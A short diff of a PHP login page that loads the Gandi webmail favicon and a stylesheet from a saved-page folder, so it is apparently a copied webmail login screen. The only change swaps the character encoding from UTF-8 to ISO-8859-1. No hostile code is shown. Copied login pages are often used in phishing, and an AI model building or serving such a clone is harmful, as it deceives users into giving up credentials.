@@ -13,7 +13,7 @@ include_once('config_inc.php');
 		<meta name="viewport" content="" id="viewport">
 		<link rel="shortcut icon" href="https://webmail.gandi.net/skins/larry/images/favicon.ico">	
 		<link rel="stylesheet" type="text/css" href="login_fichiers/styles.css">
-		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+		<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
 		
 		<script language="JavaScript">
 		
